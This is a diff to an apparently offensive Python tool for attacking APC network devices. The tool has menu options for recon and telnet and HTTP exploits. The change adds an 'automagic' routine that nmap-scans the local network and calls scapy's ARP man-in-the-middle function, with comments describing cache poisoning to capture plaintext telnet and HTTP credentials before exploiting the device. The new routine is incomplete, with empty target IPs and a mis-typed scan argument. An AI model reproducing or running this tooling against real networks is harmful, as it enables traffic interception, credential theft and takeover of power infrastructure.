@@ -2,7 +2,8 @@
 #Written by Christopher Di-Nozzi
 
 #TODO
-#Scan entire network for APC devices.
+#Finish implementing spinners.
+#Automate MITM functionality????
 
 import requests
 from pyfiglet import Figlet
@@ -13,6 +14,8 @@ import re
 import os
 import random
 from halo import Halo
+from scapy import layers
+import netifaces
 
 def prGreen(skk): print("\033[92m {}\033[00m" .format(skk))
 def prRed(skk): print("\033[91m {}\033[00m" .format(skk))
@@ -20,10 +23,6 @@ def prGreen(skk): print("\033[92m {}\033[00m" .format(skk))
 def prCyan(skk): print("\033[96m {}\033[00m" .format(skk))
 
 spinner = Halo(text_color='green',spinner='bouncingBar')
-
-
-#url="http://192.168.1.20"
-
 
 def recon(ip):
     nm = nmap.PortScanner()
@@ -173,6 +172,21 @@ def exploit_http(ip, username,password):
     if 'You are now logged off.' in response.text:
         prGreen('[+] Logged out.')
 
+def automagic():
+    print("Aye right ya skiddie! go learn how to pwn like a real h4ck3r :^)")
+    input("Press any key to confirm you suck")
+    #Scan for APC device
+    nm = nmap.PortScanner()
+    interface_info = netifaces.ifaddresses('en0')
+    ip = interface_info[netifaces.AF_INET]
+    results = nm.scan(ip,arguments='-O -sV')
+    #if found, posison all ARP cahces for any traffic going it, then monitor for plain text credentials (telnet or http)
+    #if creds found, exploit!
+    
+    apc_switch_ip=""
+    victim_ip=""
+    layers.l2.ARP.arp_mitm(victim_ip,apc_switch_ip)
+
 def print_banner():
     fonts = ['alligator','alligator2','basic','big','block','chunky','colossal','cosmic','epic','isometric1','larry3d']
     banner = Figlet(font=random.choice(fonts),width=1000)
@@ -185,6 +199,7 @@ def print_menu():
     prGreen('1) Recon')
     prGreen('2) Exploit (telnet)')
     prGreen('3) Exploit (http)')
+    prGreen('4) Automagic!')
     prRed('0) Exit')
 
     print('Enter your option: ')
@@ -204,6 +219,8 @@ def print_menu():
             username = str(input('Enter username: '))
             password = str(input('Enter password: '))
             exploit_http(ip,username,password)
+        elif i==4:
+            automagic()
         elif i==0:
             exit()
         else:
